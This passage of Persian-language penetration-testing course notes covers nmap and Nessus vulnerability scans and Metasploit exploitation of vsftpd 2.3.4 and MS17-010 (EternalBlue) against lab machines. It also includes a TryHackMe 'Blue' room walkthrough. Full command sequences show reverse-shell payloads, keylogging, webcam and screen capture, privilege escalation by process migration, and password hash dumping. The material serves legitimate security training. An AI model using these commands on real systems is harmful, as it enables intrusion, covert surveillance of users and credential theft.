	3. `New Scan Page => Basic Network Scan`
		1. در این مدل اسکن، Foot Print از اسکنر بر روی ماشین تارگت باقی نمیماند.
			1. ![[Pasted image 20240711163220.png]]
	4. `Basic Network Scan => ` Enter name for scan and Enter Scan targets
		1. ![[Pasted image 20240711163351.png]]
	5. Now click on `Save` 
	6. Goto `My Scans` Page and click on *Metasploitable 2* scan, then in scan page click on `Launch` to starting scan.
5. *Methodology-Step 2:* Search for suitable vulnerabilities `nmap --script vuln`
	1. با استفاده از اسکریپت Nmap بنام `vuln` هم میتوانیم اسکن آسیب پذیری ها را در ماشین تارگت انجام دهیم. برای استفاده کافیست به نحو زیر عمل کنیم >>
	2. `sudo nmap --script vuln 10.10.5.168`
		1. ![[Pasted image 20240712202547.png]]
	3. این اسکن آسیب پذیری را به همراه CVE آنها نشان میدهد که بسیار در حمله کمک کننده است. مثلا آسیب پذیری که بسیار مورد استفاده است. 
	4. در آزمایشگاه Eternal Blue هم باید از آن استفاده کنیم، با کد `ms17-010` شناخته میشود که با این اسکن Nmap میتوانیم این نوع آسیب پذیری را پیدا کنیم:
		1. ![[Pasted image 20240712202805.png]]
	5. حال اگر با استفاده از `searchsploit ms17-010` را جستجو کنیم میتوانیم اکسپلویت هایی که میتوانیم برای این آسیب پذیری استفاده کنیم را مشاهده کنیم:
		1. ![[Pasted image 20240712203423.png]]
6. See Result of Nessus Scanning
	1. `Nessus Web Panel => My Scan => Click on Metasploitable 2` See Scan Results
		1. ![[Pasted image 20240711163553.png]]
	2. اسکنر Nessus گزارشی کامل از انواع آسیب پذیری هایی که بر روی ماشین Metasploitable 2 وجود دارد به ما گزارش میدهد که بسیار مورد استفاده برای نفوذ و حمله است.
		1. ![[Pasted image 20240711163725.png]]
	3. در گزارش های Nessus و در تب Vulnerability میتوانیم آسیب پذیری ها را به همراه لول خطر آنها مشاهده کنیم:
		1. ![[Pasted image 20240711163900.png]]
	4. با کلیک بر روی هر آسیب پذیری میتوانیم نحوه بهره برداری Exploit از آن Vulnerability را نیز مشاهده کنیم.
----
```sh
nmap -sS -A -sC 192.168.110.22
searchsploit vsftpd 2.3.4

sudo nmap --script vuln 10.10.5.168
searchsploit ms17-010
```
### **M.Step3** Exploitation the Vulnerability - E52
#### M.Step3(Gain Access)
حال که آسیب پذیری سرویس های فعال ماشین تارگت را یافتیم، در قدم سوم Pentesting Methodology باید با استفاده از این آسیب پذیری بهره برداری و یا Exploitation را پیاده سازی کنیم و در واقع در این قدم باید نفوذ و حمله را انجام دهیم و دسترسی را به ماشین تارگت بگیریم.
#### Definition & Instruction
##### Start Exploitation
در این جلسه میخواهیم با استفاده از آسیب پذیری که در سرویس `vsftpd 2.3.4` وجود دارد، نفوذ خود را به ماشین تارگت که در اینجا Metasploitable-2 است را انجام دهیم.
	![[Pasted image 20240711165231.png]]
- *این حمله را از ماشین Kali به Metasploitable 2 انجام میدهیم.*
- همچنین برای اسیب پذیری `ms17-010` هم میتوانیم از اکسپلویت معروف `Eternal Blue` استفاده کنیم. این تمرین را در جلسه بعدی و در آزمایشگاه Try Hack Me در روم بنام Blue انجام میدهیم:
	- https://tryhackme.com/r/room/blue
		- ![[Pasted image 20240712222126.png]]
##### Instruction Steps
0. استارت `sudo msfconsole`
	1. ![[Pasted image 20240711165330.png]]
1. جستجو و سپس استفاده از اکسپلویت `use exploit/unix/ftp/vsftp_234_backdoor` 
	1. `msf6> use exploit/unix/ftp/vsftp_234_backdoor`
		1. ![[Pasted image 20240711165546.png]]
2. تنظیم مقادیر متغیر های اکسپلویت
	1. `msf6> set RHOST 192.168.1.2`
		1. ![[Pasted image 20240711165715.png]]
3. شروع بهره برداری از اکسپلویت
	1. `msf6> exploit`
		1. ![[Pasted image 20240711165854.png]]
4. بهره برداری با موفقیت تمام شد و میتوانیم به شل تارگت دسترسی داشته باشیم.
---
```sh
sudo msfconsole
"Now msfconsole startd"
msf6> use exploit/unix/ftp/vsftp_234_backdoor
msf6 exploit(unix/ftp/vsftp_234_backdoor) > set RHOST 192.168.1.2
msf6 exploit(unix/ftp/vsftp_234_backdoor) > exploit
```
#### Practical Demo
0. Start msfconsole `sudo msfconsole`
1. Search for `vsftpd` and then use `exploit/unix/ftp/vsftp_234_backdoor`
2. *Set Exploit Options*
	1. در ابتدا باید Payload را تنظیم کنیم که بصورت پیشفرض `cmd/unix/interact` است.
		1. ![[Pasted image 20240711170351.png]]
	2. `show options` See all available option for this exploit
		1. ![[Pasted image 20240711170451.png]]
	3. `set RHOSTS 192.168.110.20` RHOSTS should be target/targets machine IP
		1. ![[Pasted image 20240711170612.png]]
3. *Start Exploitation*
	1. `msf6 exploit(unix/ftp/vsftp_234_backdoor) > exploit`
	2. با شروع بهره برداری میتوانیم مشاهده کنیم که یک Shell از تارگت دریافت شده است:
		1. ![[Pasted image 20240711170818.png]]
	3. در واقع هر کامندی که الان وارد کنیم در ماشین تارگت اجرای میشود. برای Proof of Concept میتوانیم `whoami` را اجرا کرد.
	4. `whoami`
		1. ![[Pasted image 20240711171019.png]]
	5. در واقع کاراکتر یا علامتی مشاهده نمیکنیم که در Shell تارگت هستیم اما اگر پیام `Command Shell session 1 opened` را در ترمینال مشاهده کردیم به معنای این است که دستورات بعدی در ماشین تارگت اجرا میشود و در واقع از آن به بعد به Shell در ماشین تارگت متصل هستیم.
4. *Some Commands we can use in Target Shell*
	1. `?` | `help` Show all available commands
	2. `ps` Show All Process run in target machine
		1. ![[Pasted image 20240711171318.png]]
	3. `l` | `ls` | `ls -ltrh` => list of files in current directory like `dir` or `ls` commands
	4. `cd /mnt/` Move to `/mnt/` directory
5. Hacking done.
---
```sh
sudo msfconsole
msf6 > search vsftpd
msf6 > use exploit/unix/ftp/vsftp_234_backdoor
msf6 exploit(unix/ftp/vsftp_234_backdoor) > show options
msf6 exploit(unix/ftp/vsftp_234_backdoor) > set RHOSTS 192.168.110.20
msf6 exploit(unix/ftp/vsftp_234_backdoor) > exploit
"Shell Found"
"Command Shell session 1 opened"

whoami
help ; ps ; ls -ltrh ; cd /mnt
```
### **M.Step4** Post Exploitation & Escalation Privilege - E53
#### M.Step4
حال که توانستیم به ماشین تارگت نفوذ کنیم و یک Meterpreter Shell از ماشین تارگت داشته باشیم، در قدم چهارم در Pentesting Methodology باید سعی کنیم سطح دسترسی خود را بالا ببریم تا بتوانیم به داده های درون ماشین تارگت دسترسی بگیریم و از آن طریق بتوانیم کار های زیر را بر روی ماشین تارگت انجام دهیم >>
1. Accessing Target Data Records
2. Record Keystrokes
3. Take Screenshot
4. Record Microphone and View Webcam
5. etc ...
میدانیم که در `Meterpreter Shell` برای افزایش سطح دسترسی باید از `Migrate` به یک پروسه سطح بالا مانند `services.exe` استفاده کنیم.
#### Definition & Instruction
##### Post-Exploitation Phase
در این فاز از حمله در واقع پس از اینکه توانستیم به ماشین تارگت دسترسی بگیریم و متصل شویم، میتوانیم اکشن های متفاوتی را بر روی ماشین تارگت انجام دهیم:
1. Extract target data 
2. Escalation(Elevate) our privileges to `root` | `administrator`
3. Hide Presence(پنهان کردن حضور خود در ماشین تارگت)
4. *Slide*:
	1. ![[Pasted image 20240711173708.png]]
##### Meterpreter Shell Commands & Features 
با استفاده از دسترسی Meterpreter Shell و با استفاده از ماژول های آن میتوانیم  کارهای متنوعی را بر روی ماشین تارگت انجام دهیم. از معروف ترین این ماژول ها که میتوانیم از آنها استفاده کنیم، میتوان به موارد زیر اشاره کرد >>
1. *Webcam Commands*
	1. `webcam_stream` استریم کردن وب کم تارگت برای مهاجم
	2. `record_mic` رکورد میکروفون ماشین تارگت
	3. `screenshot` گرفتن اسکرین شات از ماشین تارگت
	4. `screenshare` استریم صفحه نمایش ماشین تارگت
	5. *Other*:
		1. ![[Pasted image 20240711180300.png]]
2. *User Interface Commands*
	1. `keyscan_scan` شروع فرآیند Key Logging
	2. `keyboard_send` ارسال یک کلید کیبرد
	3. `screenshare` استریم صفحه دسکتاپ تارگت برای مهاجم
	4. `mouse` ارسال رویدادی از ماوس برای ماشین تارگت
	5. *Other*:
		1. 
3. *Other Commands*
	1. `run winenum` Run `winenum` scripts to Enumerate details about windows system
	2. `shell` Change to a CMD shell from Meterpreter
4. *Slide*:
	1. ![[Pasted image 20240711174323.png]]
#### Practical Demo
1. Launch `sudo msfconsole`
2. *Search and Use suitable Exploit in here `eternal blue`*
	1. `msf6> search eternal`
		1. ![[Pasted image 20240711174716.png]]
	2. `msf6> use exploit/windows/smb/ms17_010_psexec`
		1. ![[Pasted image 20240711174854.png]]
3. *Set Exploit Options*
	1. میتوانیم در این مرحله Payload مورد استفاده که بصورت پیشفرض `windows/meterpreter/reverse_tcp` است را تغییر دهیم و بر اساس تارگت خود آنرا تنظیم کنیم. اما در این مثال از همین Payload استفاده میکنیم.
	2. `set RHOST 192.168.110.22` Target Windows IP Address
	3. `set LHOST 192.168.110.21` Kali machine IP Address
4. *Now Run Exploit*
	1. `msf6 exploit(windows/smb/ms17_010_psexec) > exploit`
	2. به محض اجرای بهره برداری میبینیم که اکسپلویت ما سعی میکند تا بوسیله یک `TCP handler`  و برقراری یک `TCP Session` یک `Meterpreter Shell` از ماشین تارگت را برای ما فراهم کند. 
	3. هنگامیکه پیغام `Meterpreter Session 1 Opened` را دیدید که آیپی آن از ماشین ویندوز تارگت به ماشین Kali بصورت Bind شده است `192.168.1.3:4444 ---> 192.168.1.2:49462` بدین معناست که `Meterpreter Shell` با موفقیت برای ما در دسترس است:
	4. `Meterpreter Session 1 Opened (192.168.1.3:4444 --> 192.168.1.2:49462) at 22-10-23 18:08:13 +0000`
		1. ![[Pasted image 20240711175905.png]]
5. *Post-Exploitation Phase with Meterpreter Shell*
	1. در اولین قدم این فاز، باید به یک پروسه که میدانیم با یوزر Full Access کار میکند مانند `powershell.exe` و یا `services.exe` و یا `cmd.exe` مهاجرت Migrate کنیم. در غیر اینصورت دسترسی لازم را برای اجرای کارهایی مانند گرفتن اسکرین شات و یا ضبط صفحه نمایش تارگت را نداریم.
	2. `Meterpreter >> migrate 3028` 3028 is a id of `explorer.exe` process
		1. ![[Pasted image 20240711180920.png]]
	3. `Meterpreter >> screenshot` Screenshots from target save in home directory
		1. ![[Pasted image 20240711181129.png]]
	4. `Meterpreter >> getuid` Get server username
		1. ![[Pasted image 20240711181316.png]]
	5. `Meterpreter >> screenshare` Start Streaming from target display on browser
		1. با اجرای این کامند، استریم صفحه دسکتاپ تارگت شروع میشود و میتوانیم این استریم را در مرورگر مشاهده کنیم. کافیست ابتدا کامند را اجرا کنیم:
			1. ![[Pasted image 20240711181433.png]]
		2. سپس خود ابزار مرورگر را باز میکند که در آن صفحه دسکتاپ تارگت استریم میشود:
			1. ![[Pasted image 20240711181616.png]]
		3. این استریم بصورت لایو است و هر عملی که تارگت انجام دهد را میتوانیم از این طریق مشاهده کنیم:
			1. ![[Pasted image 20240711181655.png]]
	6. `Meterpreter >> hashdump` Dumping SAM(Accounts) Hashes
		1. برای اینکار نیازمند دسترسی Full هستیم و با پروسه `explorer.exe` نمیتوانیم اینکار را انجام دهیم.
			1. ![[Pasted image 20240711181902.png]]
	7. `Meterpreter >> getsystem` Get all information about system
		1. این کامند هم برای اجرای نیازمند دسترسی Full است و با پروسه `explorer.exe` نمیتوانیم اینکار را انجام دهیم.
			1. ![[Pasted image 20240711182053.png]]
	8. `Meterpreter >> run ` Run a ruby script with this command
		1. برای Escalation Privilege و گرفتن دسترسی Full میتوانیم از اسکریپت های Ruby که برای اینکار نوشته شده اند استفاده کنیم.
	9. `Meterpreter >> keyscan_start` Start Key Logging
		1. با دسترسی `explorer.exe` هم میتوانیم این کامند را اجرا کنیم.
			1. ![[Pasted image 20240711182252.png]]
		2. حال کافیست تارگت مقداری را تایپ کند:
			1. ![[Pasted image 20240711182328.png]]
		3. حال کافیست `Meterpreter >> keyscan_dump` را اجرا کنیم تا مقادیری که در ماشین تارگت تایپ شده است را مشاهده کنیم:
			1. ![[Pasted image 20240711182504.png]]
	10. `Meterpreter >> keyscan_dump` Show Dumped Keys
	11. `Meterpreter >> run winenum` Start Enumerating Target windows
		1. با اجرای این کامند، یک Enumeration کامل بر روی ماشین تارگت انجام میشود و سپس نتیجه آن در `/root/` ذخیره میشود:
			1. ![[Pasted image 20240711182743.png]]
		2. میتوانیم فایل را باز کنیم تا اطلاعات ماشین تارگت را بصورت دقیق مشاهده کنیم:
			1. ![[Pasted image 20240711182944.png]]
		3. اسکریپت `winenum` مایشن ویندوزی تارگت را یک بررسی کامل از آسیب پذیری ها تا Miss configuration ها انجام میدهد و گزارش آنرا در فایلی در `root/` ذخیره میکند.
	12. `Meterpreter >> shell` Start CMD from target machine
		1. با اجاری این کامند میتوانیم به CMD ماشین ویندوزی تارگت دسترسی بگیریم:
			1. ![[Pasted image 20240711183043.png]]
		2. حال میتوانیم هر کامندی که در CMD بوطر معمول اجرا میکنیم را نیز در اینجا اجرا کنیم:
			1. ![[Pasted image 20240711183216.png]]
****
```sh
sudo msfconsole
"msfconsole started"
msf6> search eternal
msf6> use exploit/windows/smb/ms17_010_psexec
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOST 192.168.110.22 #Target Windows IP
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST 192.168.110.21 #Kali IP
msf6 exploit(windows/smb/ms17_010_psexec) > exploit
"Meterpreter Session 1 Opened (192.168.1.3:4444 --> 192.168.1.2:49462) at 22-10-23 18:08:13 +0000"
#Meterpreter Commands
Meterpreter >> help
Meterpreter >> ps
Meterpreter >> migrate 3028 #3028 id of explorer.exe process
Meterpreter >> screenshot #Screenshots from target save in home directory
Meterpreter >> getuid #Get server username 
Meterpreter >> screenshare
#start Logging target Keystrokes
Meterpreter >> keyscan_start
Meterpreter >> keyscan_dump
Meterpreter >> run winenum #Enumerate target informations
Meterpreter >> shell #Open CMD from target windows machine
"Now terminal change to CMD type"
#CMD on Meterpreter Shell
C:\Windows\System32> cd ..
C:\Windows> cd ..
C:\>
```
### Practice Pentesting Methodology with **Try Hack Me** - E54
#### Definition & Instruction
##### Practical Pentesting 
- برای تمرین فرایند های Hacking و بالا بردن سطح تجربیات در عمل میتوانیم از سرویس هایی که تمرین ها و آزمایشگاه های امنیتی و هک را ارائه میدهند استفاده کنیم. 
*از مشهور ترین آنها میتوانیم به موارد زیر اشاره کنیم:*
1. Try Hack Me
2. Hack the Box
3. Natas
4. etc ...
- حال در این جلسه هم میخواهیم به تمرین کامل فرآیند و متدلوژی Pentesting از ابتدا Scan تا انتها یعنی Post Exploitation Phase بپردازیم تا بتوانیم سطح مهارت های خود را در زمینه تست نفوذ Pentesting بالا ببریم.
	![[Pasted image 20240711183943.png]]
- متدلوژی تمرین ما در این جلسه، متدلوژی مخصوص Blue Team است که در واقع تیم محافظت میشود. در جلسات بعدی متدلوژی Red Team را نیز تمرین میکنیم.
##### Try Hack Me - Hacking Laboratory 🔬 💻
سرویس و وبسایت https://tryhackme.com یک آزمایشگاه آنلاین بزرگ برای انجام انواع تمرین های Hacking و Pentesting در تمامی متدلوژی های مختلف میباشد.
*برای راه اندازی و استفاده از آزمایشگاه مراحل زیر را دنبال میکنیم >>*
0. https://tryhackme.com Register in Website
	1. برای استفاده ابتدا باید در وبسایت بصورت رایگان Register کنیم.
		1. ![[Pasted image 20240711184618.png]]
1. in `Search bar`, search for `Blue` and Open it. this room is a Windows machine
	1. ![[Pasted image 20240711184847.png]]
2. Now we can Start Blue machine using  `Kali Linux` or `AttackBox`, in this scenario we `Use AttackBox`
	1. ![[Pasted image 20240711185100.png]]
3. *Start Machine*
	1. Now Machine started in Browser Side Panel , Now goto `Task 1 Section named Recon` and Click on `Start Machine`
		1. ![[Pasted image 20240711185315.png]]
	2. Click on `full screen` Icon to use machine in Full Scree via VNC Connection
		1. ![[Pasted image 20240711185534.png]]
	3. Now we can use this machine for `1 hour` but we `can add hours` to this.
		1. ![[Pasted image 20240711185742.png]]
	4. Also close machine `Split View` and use machine in `Full Screen View`
		1. ![[Pasted image 20240711185836.png]]
4. Laboratory and Blue Machine started Successfully.
#### Practical Demo
##### Room Description
حال میخواهیم با رعایت Pentesting Methodology، به هک ماشین Windows Blue در آزمایشگاه Try Hack me بپردازیم. برای اینکار، در اولین قدم باید اسکن را شروع کنیم.
برای انجام این حمله تارگت پورت `tcp/445` تارگت باید باز باشد(این را در اسکن اول بدست میاوریم)، همچنین آسیب پذیری `ms17-010` که مربوط به سرویس `smb` است نیز باید در تارگت وجود داشته باشد(این را در اسکن دوم بدست میاوریم) نام کلی این آسیب پذیری هم `Remote Code Execution Vulnerability in Microsoft smbv1 servers` میباشد.
	![[Pasted image 20240712225247.png]]

##### TASK 1 - Recon
1. *Target Ports, Services, Softwares Detection Scanning* `nmap -sS -sC -sV`
	1. برای شروع اسکن، نیاز به آیپی ماشین تارگت داریم که در صفحه آزمایشگاه میتوانیم آن آیپی را برداریم.
		1. ![[Pasted image 20240712160355.png]]
	2. `sudo nmap -sS -sC -sV -O 10.10.193.161`
		1. `-sS` TCP SYN Scan
		2. `-sC`
			1. The `-sC` flag in nmap stands for *"script scan"* and is used to run a set of default scripts to *identify potential vulnerabilities on the target system*. This flag can be used to quickly *identify common security issues* without the need to manually select and run individual scripts.
		3. `-sV`
			1. The `-sV` flag in nmap stands for *"version detection"* and is used to determine the *software and version numbers running on the target system*. This flag can help identify outdated or vulnerable software that may be exploited by attackers.
	3. در نتیجه اسکن میتوانیم مشاهده کنیم که پورت `445/tcp` باز است که در این جلسه با استفاده از این پورت و آسیب پذیری `ms17-010` میخواهیم نفوذ خود را انجام دهیم.
		1. ![[Pasted image 20240712160047.png]]
	4. همچنین در نتیجه *Host Script results* میتوانیم ورژن دقیق سیستم عامل تارگت را نیز مشاهده کنیم:
		1. ![[Pasted image 20240712160216.png]]
2. *Vulnerability Scanning* `nmap --script vuln`
	1. حال باید آسیب پذیری هایی که در ماشین تارگت وجود دارد را پیدا کنیم. برای اینکار از اسکریپت Nmap بنام `vuln` استفاده میکنیم. در واقع کامند زیر را برای اسکن وارد میکنیم:
	2. `sudo nmap --script vuln 10.10.193.161`
		1. ![[Pasted image 20240712161109.png]]
	3. در نتیجه اسکن میتوانیم مشاهده کنیم که آسیب پذیری `Remote Code Execution Vulnerability in Microsoft smbv1 servers` که مختصر آن `ms17-010` است در ماشین تارگت وجود دارد.
	4. همچنین جواب سوال دوم آزمایشگاه هم که *این ماشین به کدام vuln آسیب پذیر است؟* آسیب پذیری است که در بالا یافتیم *Ms17-010*
		1. ![[Pasted image 20240712161426.png]]
	5. حال که جواب دو سوال Task 1 اول *Recon* را دادیم میتوانیم به *Section Gain Access* همان *Task 2* برویم.
		1. ![[Pasted image 20240712161550.png]]
3. *TASK 1 Questions*
	1. در صفحه آزمایشگاه، چندین سوال در مورد ماشین تارگت پرسیده شده است که برای رفتن به مرحله بعدی باید به این سوال ها جواب دهیم.
	2. یکی از آنها این است که *چند پورت زیر 1000 در ماشین تارگت باز است؟* که جواب *3 عدد* است. این جواب را در اسکن معمولی Nmap بدست آوردیم. 
		1. `sudo nmap -p1-1000 10.10.196.110`
			1. ![[Pasted image 20240712160702.png]]
	3. در سوال دوم *نام آسیب پذیری(کد) آنرا باید وارد کنیم* `ms17-010`
		1. ![[Pasted image 20240712225104.png]]
```sh
sudo nmap -sS -sC -sV -O 10.10.193.161 #Detection Scanning
sudo nmap --script vuln 10.10.193.161 #Vulnerability Scanning
```
##### TASK 2 - Gain Access
1. *Launch `msfconsole`*
	0. در این task باید با استفاده از Metasploit و Payload با نام `windows/x64/shell/reverse_tcp` به ماشین ویندوزی تارگت نفوذ کنیم.
		1. ![[Pasted image 20240712162010.png]]
	1. `search ms17-010` or `search eternal`
		1. ![[Pasted image 20240712162333.png]]
	3. `use exploit/windows/smb/ms17_010_eternalblue`
		1. ![[Pasted image 20240712162721.png]]
2. *Configure Payload & Run Exploit*
	0. در قدم بعدی باید Option های اکسپلویت را تنظیم کنیم. ابتدا حمله را با Payload پیشفرض انجام میدهیم که به ما دسترسی `Meterpreter Shell` میدهد.  پس از گرفتن این دسترسی Payload عوض میکنیم تا دسترسی `Shell` را بگیریم.
	1. Default Payload is => `windows/x64/meterpreter/reverse_tcp`
	3. حال آیپی تارگت را در پارامتر `RHOSTS` وارد میکنیم.
	4. `set RHOSTS 10.10.193.161`
	5. پس از تنظیم این مقدار هم میتوانیم Exploit را برای گرفتن دسترسی `Meterpreter Shell` شروع کنیم.
	6. `msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit`
		1. ![[Pasted image 20240712163431.png]]
	7. گفتیم که با این Payload، میتوانیم دسترسی `Meterpreter Shell` را دریافت کنیم، اما در این آزمایشگاه ما ابتدا نیازمند دسترسی `Shell CMD` هستیم، به همین خاطر از Meterpreter خارج میشویم تا Payload را عوض کنیم و بتوانیم دسترسی Shell بگیریم.
		1. ![[Pasted image 20240712163546.png]]
	8. `Meterpreter > exit`
	9. `set payload windows/x64/shell/reverse_tcp`
		1. ![[Pasted image 20240712163956.png]]
	10. حال که دوباره Exploit را شروع کنیم میتوانیم به ماشین تارگت دسترسی `Shell CMD` بگیریم.
	11. `msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit`
		1. ![[Pasted image 20240712164313.png]]
	12. حال میتوانیم تمام کامند های CMD را در ماشین تارگت اجرا کنیم.
	13. `C:\Windows\System32> whoami`
		1. ![[Pasted image 20240712164516.png]]
3. *Sessions in Metasploit*
	1. آزمایشگاه میگوید که Shell که در آن توانستید دسترسی `CMD Shell` بگیرید را به Background Process با استفاده از `CTRL+Z` ببرید:
		1. ![[Pasted image 20240712164920.png]]
	2. با اینکار به صفحه اصلی `msfconsole` برمیگردیم. حال اگر بخواهیم دوباره به این Session برگردیم، کافیست از کامند Session برای مشاهده session های فعال و رفتن به آنها استفاده کنیم.
	3. `msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions`
		1. ![[Pasted image 20240712165157.png]]
	4. `msf6 exploit(windows/smb/ms17_010_eternalblue) > set SESSION 2` Set Current Session on Session 2
	5. `msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions -i 3` Go to Session 3
4. *TASK 2 Questions*
	1. جواب سوال اول Task 2 هم، که *اکسپلویت مناسب آسیب پذیری ماشین تارگت را نام ببرید* اکسپلویت      ` exploit/windows/smb/ms17_010_eternalblue` میباشد.
		1. ![[Pasted image 20240712162628.png]]
	2. جواب سوال دوم در Task 2 هم که *میگوید Show Options را انجام دهید و یکی از پارامتر های Required را نام ببرید(CAPSLOCK ON)* میتوانیم مقدار *RHOSTS* را وارد کنیم.
		1. ![[Pasted image 20240712163157.png]]
	3. در آخر هم به صفحه آزمایشگاه Task 2 میرویم و بر روی *جواب سوال سوم*که *Run Exploit* است کلیک میکنیم، سپس هم بر روی `Complete` کلیک میکنیم تا بتوانیم وارد `Task 3 Escalate` بشویم.
		1. ![[Pasted image 20240712164730.png]]
```sh
sudo msfconsoel
"---msfconsole launched---"
msf6 > search ms17-010
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > options
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.193.161
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
"TCP Handler Started and now accessing to Meterpreter Shell"
"10.10.193.161:445==================="
Meterpreter > exit
"Back to msf6 exploit(windows/smb/ms17_010_eternalblue) to set new payload"
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
"TCP Handler Started and now accessing to CMD Shell"
C:\Windows\System32> whoami
```
##### TASK 3 - Escalate
1. *Escalation Privileges*
	0. در این مرحله باید سعی کنیم دسترسی را که گرفتیم بالا ببریم. در واقع الان از ماشین تارگت یک `Shell CMD` داریم، حال میخواهیم این شل را به `Meterpreter Shell` تغییر دهیم. ابتدا باید Exploit و Payload مناسب را پیدا کنیم.
	1. `msf6 exploit(windows/smb/ms17_010_eternalblue) > search shell_to_meterpreter`
		1. ![[Pasted image 20240712165620.png]]
	2. برای استفاده از این اکسپلوبت یافت شده میتوانیم هم از اسم Exploit و هم از ایدی Exploit که در جستجو برای آن در نظر گرفته شده است استفاده کنیم:
	3. `use post/multi/manage/shell_to_meterpreter` or `use 0`
		1. ![[Pasted image 20240712165932.png]]
	4. حال گزینه ها را بررسی میکنیم، سپس هم Exploit را شروع میکنیم اما فعلا عملیات با موفقیت انجام نمیشود.
		1. `msf6 post(windows/smb/ms17_010_eternalblue) > options`
		2. `msf6 post(windows/smb/ms17_010_eternalblue) > exploit`
	5. یکی از پارامتر های Required در ماژول `shell_to_meterpreter` پارامتر **SESSION** است که باید حتما تنظیم شود. در واقع بدلیل اینکه این اکسپلویت باید بر روی یک Session موجود(در این سناریو CMD Shell) انجام شود باید حتما Required Option با نام `SESSION` را با PID مربوط به Session Shell CMD مقدار دهی کنیم. 
	6. بنابراین برای اینکه Exploit ما با موفقیت کار کند باید ابتدا مقدار `SESSION` را بر روی `Shell CMD` تنظیم کنیم تا شل آن session از cmd به Meterpereter تغییر کند.
		1. `msf6 post(windows/smb/ms17_010_eternalblue) > set SESSION 2`
		2. `msf6 post(windows/smb/ms17_010_eternalblue) > exploit`
			1. ![[Pasted image 20240712170643.png]]
	7. حال با اجرای Exploit، دسترسی `Shell CMD` به `Meterpreter Shell` تغییر میکند و میتوانیم در پس زمینه به این شل دسترسی بگیریم.
		1. `msf6 post(windows/smb/ms17_010_eternalblue) > sessions`
			1. ![[Pasted image 20240712171036.png]]
		2. `msf6 post(windows/smb/ms17_010_eternalblue) > sessions -i 3`
		3. `Meterpreter > ls`
2. *Meterpereter Escalation*
	0. حال باید دسترسی خود را در `Meterpreter Shell` بالا ببریم. برای اینکار ابتدا باید به پروسه ای که با دسترسی Full مهاجرت Migrate را انجام دهیم. در اینجا میخواهیم به `services.exe` مهاجرت کنیم.
		1. `Meterpreter > ps` Copy `services.exe` *PID*
			1. ![[Pasted image 20240712171522.png]]
		2. `Meterpreter > migrate 708` 708 is `services.exe` *PID*
			1. ![[Pasted image 20240712171556.png]]
	1. در واقع با انجام Migrate، از کاربر معمولی به کاربر ادمین تغییر دسترسی میدهیم. برای اثبات این موضوع میتوانید قبلا از Migrate با استفاده از `Meterpreter > getuid` یوزر فعلی را دربیاوریم و پس از Migrate نیز بار دیگر اینکار را انجام دهیم تا از تغییر یوزر به `system || Administrator` اطمینان حاصل کنیم.
		1. ![[Pasted image 20240712174654.png]]
	2. برای `Proof of Concept` بالا بردن سطح دسترسی باید بتوانیم `hashdump` را اجرا کنیم، اگر این کامند با موفقیت انجام شود بدین معناست که Escalation Privileges با موفقیت انجام شده است.
		1. `Meterpreter > hashdump`
			1. ![[Pasted image 20240712175004.png]]
3. *Answer TASK 3 Questions*
	0. حال میتوانیم به صفحه آزمایشگاه Task 3 برگردیم و به سوالات آزمایشگاه جواب دهیم >>
	1. سوال اول میگوید *اکسپلویت که پس از نفوذ در واقع Post Exploitation، از آن برای تغییر Shell به Meterpreter استفاده میکنیم چه نام دارد؟* جواب >>
		1. `post/multi/manage/shell_to_meterpreter`
			1. ![[Pasted image 20240712180258.png]]
	2. سوال دوم میگوید *در اکسپلویت `shell_to_meterpreter` مقدار دهی کدام یک از Option ها Required است؟* جواب >>
		1. `SESSION`
			1. ![[Pasted image 20240712180304.png]]
	3. سایر سوالات هم که مربوط به مراحل عملی است که انجام دادیم، بنابراین فقط کافیست بر روی `Completed` کلیک کنیم و درصورتیکه اینکار را بدرستی در `AttackBox` انجام داده باشیم `Correct Answer` را دریافت میکنیم.
		1. ![[Pasted image 20240712181003.png]]
	4. *جواب سوالات به ترتیب >>*
		1. تنظیم Required Options های `post/multi/manage/shell_to_meterpreter`
		2. شروع exploit حتی اگر بدرستی هم کار نکند قبول است.
		3. انتخاب SESSION مناسب برای تغییر از `Shell CMD` به `Meterpreter Shell`
			1. ![[Pasted image 20240712181347.png]]
		4. اجرای `whoami` در `Meterpreter` باید خروجی `Authority/System` را داشته باشد.
		5. لیست کردن تمام پروسه های ماشین تارگت با `ps` برای انجام مهاجرت
		6. سپس مهاجرت به پروسه ای که از یوزری با دسترسی `Authority/System` استفاده میکند(مانند `services.exe` و یا `cmd.exe`) 
			1. ![[Pasted image 20240712181552.png]]
	5. حال میتوانیم به TASK 4 که Cracking نام دارد برویم.
```sh
msf6 post(windows/smb/ms17_010_eternalblue) > search shell_to_meterpreter
msf6 post(windows/smb/ms17_010_eternalblue) > use 0
"Or"
msf6 post(windows/smb/ms17_010_eternalblue) > use post/multi/manage/shell_to_meterpreter
msf6 post(windows/smb/ms17_010_eternalblue) > options #Check LHOST Set right
msf6 post(windows/smb/ms17_010_eternalblue) > exploit #Don't work
msf6 post(windows/smb/ms17_010_eternalblue) > set SESSION 2
msf6 post(windows/smb/ms17_010_eternalblue) > exploit
"Now Exploit started and CMD Shell Change to Meterpreter Shell"
"You can access to this shell in background process"
msf6 post(windows/smb/ms17_010_eternalblue) > sessions
msf6 post(windows/smb/ms17_010_eternalblue) > sessions -i 3

"Meterpreter Shell Starded"
Meterpreter > ls
Meterpreter > ps #Copy `services.exe` *PID*
Meterpreter > migrate 708 #708 is `services.exe` *PID*
Meterpreter > getuid #must be changed to SYSTEM\Authority User
Meterpreter > hashdump #Escalation Privilege Proof of Concept
```
	![[Pasted image 20240712171125.png]]
##### TASK 4 - Cracking
1. *Get Hash of non Default User*
	0. در این مرحل باید ابتدا بوسیله `hashdump` در `Meterpreter Shell` که از ماشین تارگت گرفتیم مقدار هش شده پسورد اکانت یک کاربر ماشین تارگت را بدست بیاوریم و سپس با کرک مقدار هش شده، به پسورد اکانت ویندوزی برسیم. برای انجام اینکار >>
